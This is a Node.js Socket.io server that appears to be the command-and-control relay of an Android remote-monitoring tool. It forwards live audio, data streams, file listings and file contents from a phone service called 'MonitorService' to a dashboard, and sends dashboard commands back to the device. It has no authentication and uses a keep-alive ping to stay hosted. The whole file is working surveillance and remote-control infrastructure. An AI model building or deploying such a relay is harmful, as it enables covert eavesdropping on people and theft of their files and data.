const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 2e7 // 20MB for file transfers
});

io.on('connection', (socket) => {
    console.log(`Connected: ${socket.id}`);

    // ANDROID -> SERVER -> DASHBOARD (Data coming from phone)
    socket.on('data-stream', (data) => socket.broadcast.emit('data-stream', data));
    socket.on('audio-stream', (data) => socket.broadcast.emit('audio-stream', data));
    
    // Catching the file list from MonitorService.java
    socket.on('file-list', (data) => {
        console.log("File list received from phone, sending to dashboard...");
        socket.broadcast.emit('file-list', data);
    });

    // Catching the file content for download
    socket.on('file-download-ready', (data) => {
        socket.broadcast.emit('file-download-ready', data);
    });

    // DASHBOARD -> SERVER -> ANDROID (Commands you click)
    socket.on('command', (cmd) => {
        console.log(`Forwarding command to device: ${cmd}`);
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => console.log(`Disconnected: ${socket.id}`));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
    if (RENDER_URL) {
        setInterval(() => {
            https.get(RENDER_URL, (res) => {}).on('error', (e) => {});
        }, 600000); 
    }
});
